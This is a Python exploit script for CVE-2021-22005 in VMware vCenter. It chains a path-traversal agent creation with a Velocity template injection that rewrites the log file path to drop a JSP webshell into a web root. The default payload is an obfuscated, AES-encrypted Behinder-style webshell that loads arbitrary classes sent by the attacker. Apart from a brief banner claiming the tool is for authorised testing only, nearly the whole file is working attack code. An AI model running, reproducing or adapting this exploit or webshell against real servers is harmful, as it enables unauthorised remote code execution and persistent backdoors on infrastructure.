import random
import string
import click
import requests
from requests.exceptions import ChunkedEncodingError, ConnectionError, ConnectTimeout
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def random_str(size=6, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

def str_to_unicode(_str):
    unicode_str = ''
    for s in _str:
        val = ord(s)
        str_uni = "\\u{:04x}".format(val)
        unicode_str += str_uni
    return unicode_str

def exploit(url,agent_name,log_param,manifestData):
    exploit_url = "%s/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c=%s&_i=%s" % (url,agent_name,log_param)
    headers = {
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0",
        "X-Deployment-Secret": "abc",
        "Content-Type": "application/json",
        "Connection": "close"
    }
    json_data = {
        "contextData": "a3", "manifestContent": manifestData, "objectId": "a2"
    }
    try:
        request = requests.post(exploit_url,headers=headers,json=json_data,verify=False)
        if request.status_code == 200:
            url = "%s/idm/..;/%s" % (url, shell_name)
            return url
        else:
            return "ERROR: Exploit failed"
    except ConnectionError as e:
        return "ERROR:" + "HTTP连接错误"
    except ConnectTimeout as e:
        return "ERROR:" + "HTTP连接超时错误"
    except Exception as e:
        return 'ERROR:' + str(e)

def createAgent(url,agent_name,log_param):
    url = "%s/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c=%s&_i=%s" % (url, agent_name, log_param)
    headers = {
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0",
        "X-Deployment-Secret": "abc",
        "Content-Type": "application/json",
        "Connection": "close"
    }
    json_data = {
        "manifestSpec": {},
        "objectType": "a2",
        "collectionTriggerDataNeeded": True,
        "deploymentDataNeeded": True,
        "resultNeeded": True,
        "signalCollectionCompleted": True,
        "localManifestPath": "a7",
        "localPayloadPath": "a8",
        "localObfuscationMapPath": "a9"
    }
    try:
        request = requests.post(url,json=json_data,headers=headers,verify=False)
        if request.status_code == 201:
            return "cve-2021-22005"
        else:
            return "ERROR: Agent creation failed."
    except ConnectionError as e:
        return "ERROR:" + "HTTP连接错误"
    except ConnectTimeout as e:
        return "ERROR:" + "HTTP连接超时错误"
    except Exception as e:
        return 'ERROR:' + str(e)

def create_webshell(webshell_path, webshell):
    shell_file = """<manifest recommendedPageSize="500">
       <request>
          <query name="vir:VCenter">
             <constraint>
                <targetType>ServiceInstance</targetType>
             </constraint>
             <propertySpec>
                <propertyNames>content.about.instanceUuid</propertyNames>
                <propertyNames>content.about.osType</propertyNames>
                <propertyNames>content.about.build</propertyNames>
                <propertyNames>content.about.version</propertyNames>
             </propertySpec>
          </query>
       </request>
       <cdfMapping>
          <indepedentResultsMapping>
             <resultSetMappings>
                <entry>
                   <key>vir:VCenter</key>
                   <value>
                      <value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="resultSetMapping">
                         <resourceItemToJsonLdMapping>
                            <forType>ServiceInstance</forType>
                         <mappingCode><![CDATA[    
                            #set($appender = $GLOBAL-logger.logger.parent.getAppender("LOGFILE"))##
                            #set($orig_log = $appender.getFile())##
                            #set($logger = $GLOBAL-logger.logger.parent)##     
                            $appender.setFile("%s")##     
                            $appender.activateOptions()##  
                            $logger.warn("%s")##   
                            $appender.setFile($orig_log)##     
                            $appender.activateOptions()##]]>
                         </mappingCode>
                         </resourceItemToJsonLdMapping>
                      </value>
                   </value>
                </entry>
             </resultSetMappings>
          </indepedentResultsMapping>
       </cdfMapping>
       <requestSchedules>
          <schedule interval="1h">
             <queries>
                <query>vir:VCenter</query>
             </queries>
          </schedule>
       </requestSchedules>
    </manifest>""" % (webshell_path, webshell)
    return shell_file

def create_shell_code(shell_code=None):
    if shell_code:
        shell_code_file = []
        with open(shell_code, "r", encoding="utf-8") as f:
            for line in f.readlines():
                shell_code_file.append(line)

        shell_code = ''.join(i for i in shell_code_file)
    else:
        shell_code = r"""Hello Administrator!
WelCome To Tas9er JSP Console!<%@page import="sun.misc.*,javax.crypto.Cipher,javax.crypto.spec.SecretKeySpec,java.util.Random" %>
<%!
    class gov5ltbRqtFDoIMIGX extends \u0043l\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 {
        gov5ltbRqtFDoIMIGX(\u0043l\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 govBqJz615GKWfm) {
            super(govBqJz615GKWfm);
        }
        public Class govFPVTX(byte[] gov0uG4) {
            return super.d\uuuuuuuuu0065fineClass/*gov1G*/(gov0uG4,0,gov0uG4.length);
        }
    }
%><%
    out.println("Random Garbage Data:");
    Random govO5T26n67VWi9 = new Random();
    int govdlY3zyC8gMvIdw = govO5T26n67VWi9.nextInt(1234);
    int govht = govO5T26n67VWi9.nextInt(5678);
    int govmwkKimgKcCPdG = govO5T26n67VWi9.nextInt(1357);
    int govwqoiCtJz7aKFyI = govO5T26n67VWi9.nextInt(2468);
    out.println(govdlY3zyC8gMvIdw+","+govht+","+govmwkKimgKcCPdG+","+govwqoiCtJz7aKFyI);
    String[] govLL = new String[]{"A", "P", "B", "O", "C", "S", "D", "T"};
    String gov2Iy33L4FYQxgtK = govLL[1] + govLL[3] + govLL[5] + govLL[7];
    if (request.getMethod().equals(gov2Iy33L4FYQxgtK)) {
        String govYXsRX = new String(new B\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072()/*govgPRHYJrW7*/./*gov7MZ3Gib0AGE*/decodeBuffer/*govxajxEFUqdVj*/("MTZhY2FjYzA1YWFmYWY2Nw=="));
        session.setAttribute("u", govYXsRX);
        Cipher govI6X8twai = Cipher.getInstance("AES");
        govI6X8twai.init(((govdlY3zyC8gMvIdw * govht + govmwkKimgKcCPdG - govwqoiCtJz7aKFyI) * 0) + 3 - 1, new SecretKeySpec(govYXsRX.getBytes(), "AES"));
        new gov5ltbRqtFDoIMIGX(this.\u0067\u0065t\u0043\u006c\u0061\u0073\u0073().\u0067\u0065t\u0043\u006c\u0061\u0073\u0073Loader()).govFPVTX(govI6X8twai.doFinal(new sun.misc./*govZvxr*/B\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072()./*govgC2dNLj4i*/decodeBuffer(request.getReader().readLine()))).newInstance()/*gov74*/.equals(pageContext);
    }
%>"""
    return str_to_unicode(shell_code)

def usage():
    print("")
    print("CVE-2021-22005_rce / vCenter任意文件上传RCE")
    print("Code By:Jun_sheng @Github:https://github.com/jun-5heng/")
    print("橘子网络安全实验室 @https://0range.team/")
    print("")
    print("*************************警 告*****************************")
    print("本工具旨在帮助企业快速定位漏洞修复漏洞,仅限授权安全测试使用!")
    print("严格遵守《中华人民共和国网络安全法》,禁止未授权非法攻击站点!")
    print("***********************************************************")
    print("")

CONTEXT_SETTINGS = dict(help_option_names=['-h','--help'])

@click.command(context_settings=CONTEXT_SETTINGS)
@click.option('-u', '--url', help="Enter attack target")
@click.option('-p', '--proxy', is_flag=True, help="Use HTTP proxy")
@click.option('--shell_file', help="Customize webshell file contents, enter the file path")
def main(url, proxy, shell_file):
    global proxies
    global shell_name

    usage()

    if url:
        if proxy:
            proxies = {
                "http": "127.0.0.1:8080",
                "https": "127.0.0.1:8080"
            }
        else:
            proxies = None

        log_param = random_str(6)   #
        agent_name = random_str(6)
        shell_name = random_str(6) + ".jsp"

        webshell_path = "/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/%s" % shell_name


        if not shell_file:
            click.secho("[+] 默认集成冰蝎webshell,密码默认为:Tas9er", fg='green')
            shell_code = create_shell_code()
        else:
            shell_code = create_shell_code(shell_file)

        manifestData = create_webshell(webshell_path, shell_code)

        create_result = createAgent(url,agent_name,log_param)
        if str(create_result).startswith("ERROR:"):
            click.secho(create_result, fg='red')
        else:
            exploit_result = exploit(url,agent_name,log_param,manifestData)
            if str(exploit_result).startswith("ERROR:"):
                click.secho(exploit_result, fg='red')
            else:
                click.secho(f'[+] WebShell 路径为:{exploit_result}', fg='green')

if __name__ == '__main__':
    main()
